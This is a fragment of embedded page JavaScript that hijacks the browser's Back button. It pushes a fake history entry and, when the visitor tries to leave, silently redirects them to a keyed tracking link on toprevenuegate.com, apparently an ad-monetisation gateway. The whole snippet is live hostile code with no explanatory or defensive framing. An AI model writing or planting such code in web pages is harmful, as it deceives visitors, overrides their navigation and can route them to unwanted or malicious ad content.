type='text/javascript'>
//<![CDATA[
(function(window, location) {
history.replaceState(null, document.title, location.pathname+"#!/history");
history.pushState(null, document.title, location.pathname);

window.addEventListener("popstate", function() {
if(location.hash === "#!/history") {
history.replaceState(null, document.title, location.pathname);
setTimeout(function(){
location.replace("https://www.toprevenuegate.com/py0sddpe83?key=0e45ea863f0532af90c5a79e6dd5d152");
},10);
}
}, false);
}(window, location));
//]]>
